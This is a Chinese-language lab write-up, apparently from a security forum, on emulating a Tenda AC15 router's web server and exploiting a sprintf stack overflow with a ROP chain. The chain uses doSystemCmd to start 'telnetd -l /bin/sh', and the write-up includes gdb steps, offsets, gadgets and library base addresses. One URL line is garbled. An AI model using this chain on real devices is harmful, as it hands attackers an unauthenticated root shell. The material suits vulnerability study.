
`/tmp/nvram_default.cfg` 是 `/webroot/nvram_default.cfg` 复制过来的

查看 `httpd` 的 GCC 版本，使用的是 Buildroot ，C 标准库是 `uClibc`

```bash
strings bin/httpd | grep "GCC"
GCC_3.5
GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
GCC: (Buildroot 2012.02) 4.5.3
```

根据 GITHUB 上的 `buildroot` 项目，编译生成支持 `ARMv7` + `uClibc` + `soft-float` 的 `arm-linux-gcc`

编译命令如下：

```bash
./buildroot/output/host/bin/arm-linux-gcc -shared -fPIC hook_nvram.c -o hook_nvram.so -ldl
```

生成的 `hook_nvram.so` ELF 信息文件如下：

```
ELF Header:
Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
Class:                             ELF32
Data:                              2's complement, little endian
Version:                           1 (current)
OS/ABI:                            UNIX - System V
ABI Version:                       0
Type:                              DYN (Shared object file)
Machine:                           ARM
Version:                           0x1
Entry point address:               0x0
Start of program headers:          52 (bytes into file)
Start of section headers:          10940 (bytes into file)
Flags:                             0x5000200, Version5 EABI, soft-float ABI
Size of this header:               52 (bytes)
Size of program headers:           32 (bytes)
Number of program headers:         5
Size of section headers:           40 (bytes)
Number of section headers:         24
Section header string table index: 23
Attribute Section: aeabi
File Attributes
Tag_CPU_name: "7VE"
Tag_CPU_arch: v7
Tag_CPU_arch_profile: Application
Tag_ARM_ISA_use: Yes
Tag_THUMB_ISA_use: Thumb-2
Tag_ABI_PCS_wchar_t: 4
Tag_ABI_FP_denormal: Needed
Tag_ABI_FP_exceptions: Needed
Tag_ABI_FP_number_model: IEEE 754
Tag_ABI_align_needed: 8-byte
Tag_ABI_enum_size: int
Tag_CPU_unaligned_access: v6
Tag_MPextension_use: Allowed
Tag_DIV_use: Allowed in v7-A with integer division extension
Tag_Virtualization_use: TrustZone and Virtualization Extensions
```

主机运行 `python ./uds_server.py` 创建 `./var/cfm_socket`

`sudo chroot . bin/sh` 进入固件目录环境，再运行 `LD_PRELOAD=/tmp/hook_nvram.so /bin/httpd` 开启 HTTP 服务

```
python ./uds_server.py
~ # LD_PRELOAD=/tmp/hook_nvram.so /bin/httpd
init_core_dump 1816: rlim_cur = 0, rlim_max = 0
init_core_dump 1825:
open core dump success
init_core_dump 1834: rlim_cur = 5242880, rlim_max = 5242880
Yes:
******WeLoveLinux******
Welcome to ...
create socket  fail -1
[httpd][debug]--------------------------webs.c,157
httpd listen ip = 192.168.3.3 port = 80
webs: Listening for HTTP requests at address 192.168.3.3
```

访问 `addK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0y4Q4x3X3f1K6i4K6u0r3L8r3!0Y4K9h3&6Q4x3X3g2Z5N6r3#2D9` 页面如下

![HTTP LOGIN](https://bbs.kanxue.com/upload/attach/202601/920134_QXWMZAHF47T9W6U.webp)

## 漏洞利用

首先查看 `httpd` 开启的防护如下

```bash
checksec ./bin/httpd
[*] '/home/chialin/kctf/tenda/tendaac15/bin/httpd'
Arch:       arm-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8000)
```

使用调试模式启动 `httpd` , 然后在 `0x0061998` `BL sprintf` 的溢出点下断点

`gdb.txt` 的加载脚本如下

```bash
file /kctf/tenda/tendaac15/bin/httpd
set sysroot /kctf/tenda/tendaac15
target remote 127.0.0.1:1234
b *0x00061998
```

`python ./uds_server.py` 重启 `uds` ， `sudo chroot . qemu-arm-static -g 1234 -E LD_PRELOAD=/tmp/hook_nvram.so /bin/httpd` 调试模式启动 ， 然后 `gdb-multiarch -x gdb.txt` 程序就断在了 `_start` 开始处

![GDB START](https://bbs.kanxue.com/upload/attach/202601/920134_RMFWPS739XPE3WC.webp)

然后使用 `cyclic` 生成测试字符串 ， 使用 `PYTHON` `POC` 脚本的 `HTTP` 协议进行发送

```bash
pwndbg> cyclic 0xff
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa
```

程序正常断在 `sprintf@plt` 函数处

![GDB SPRINTF](https://bbs.kanxue.com/upload/attach/202601/920134_CC6WMW9NE6SEYSM.webp)

查看目的地址 `0x407ff9f8` 正常情况下的栈数据

![GDB SPRINTF](https://bbs.kanxue.com/upload/attach/202601/920134_254SXWFJCVQRX58.webp)

`sprintf` 后的栈数据如下

![GDB SPRINTF](https://bbs.kanxue.com/upload/attach/202601/920134_56QT7XZGJ4BHXFY.webp)

单步运行到函数的结束处

![GDB SPRINTF](https://bbs.kanxue.com/upload/attach/202601/920134_4S9B6JCEJUAA2HF.webp)

可以看到最后是 `r11 0x407ffa34 ◂— 0x61616a61 ('ajaa')` 的数据被弹出到 `PC` 寄存器

偏移地址为 `35` 处

```bash
pwndbg> cyclic -l ajaa
Finding cyclic pattern of 4 bytes: b'ajaa' (hex: 0x616a6161)
Found at offset 35
```

如果调用 `system` 函数， 需要首先设置 `R0` 的值指向需要执行的命令地址

但是 `system` 的函数汇编代码如下

```
; int __fastcall system(int)
WEAK system
system
var_30= -0x30
var_24= -0x24
var_20= -0x20
var_1C= -0x1C
var_18= -0x18
var_14= -0x14
var_C= -0xC

LDR             R3, =(_GLOBAL_OFFSET_TABLE_ - 0x40A4528C) ; Alternative name is '__libc_system'
CMP             R0, #0
PUSH            {R4,LR}
SUB             SP, SP, #0x28
...
...
...
ADD             SP, SP, #0x28 ;
POP             {R4,PC}
```

`system` 运行结束后 ，弹出到 `PC` 寄存器的是 `LR` 的值 ，如果不控制 `LR` 的值程序就会崩溃，现在需要找一个 `BL system` 的指令来自动设置 `LR` 的值

`libcommon.so` 中的 `doSystemCmd` 函数正好符合， 然后 `flush_dns_cache` 的调用 `doSystemCmd` 代码如下

```
.text:00009A4C                 MOV             R0, R3
.text:00009A50                 BL              j_doSystemCmd
.text:00009A54                 POP             {R3,R4,R11,PC}
```

这段代码非常符合参数的设置，首先设置 `R3` 的地址指向需要执行的命令 `telnetd -l /bin/sh`

让弹出到 `PC` 寄存器的地址指向 `libc.so.0` 的 `_exit` 函数

使用 `ROPgadget` 查找设置 `R3` 值的指令

```bash
ROPgadget --binary ./lib/libcommon.so --only "pop"
Gadgets information
============================================================
0x00003e58 : pop {fp, pc}
0x00015be4 : pop {r1, pc}
0x00009a54 : pop {r3, r4, fp, pc}
0x00015c20 : pop {r3, r4, r5, r6, r7, pc}
0x00003454 : pop {r4, fp, pc}
0x00003350 : pop {r4, pc}
0x00004570 : pop {r4, r5, fp, pc}
0x00006cf8 : pop {r4, r5, r6, fp, pc}
0x000160c0 : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x0000ab98 : pop {r4, r5, r6, r7, r8, sl, fp, pc}

Unique gadgets found: 10
```

选取 `0x00015c20` 作为设置 `R3` 值的指令

结合 `vmmap` 和 `info sharedlibrary` 计算 `libcommon.so` 的基址为 `0x40854000` ， `libc.so.0` 的基址为 `0x409EB000`

![POC](https://bbs.kanxue.com/upload/attach/202601/920134_HKVTES2G33US355.webp)

栈的数据结构如下

![POC](https://bbs.kanxue.com/upload/attach/202601/920134_THTEDMVCXSTUFUE.webp)

开启 `telnetd` 服务还需要挂载 `devpts` ， 不然程序会提示 `telnetd: can't find free pty`

```bash
sudo mount -o bind /dev ./dev/
sudo mount -t devpts devpts ./dev/pts
```

运行 `POC` 后查看运行的进程信息

```bash
ps -aux | grep telnetd
root        5799  0.0  0.0 4404548 5872 ?        Ssl  00:51   0:00 /usr/libexec/qemu-binfmt/arm-binfmt-P /usr/sbin/telnetd telnetd -l /bin/sh
```

`telnet 192.168.3.3` 进行测试
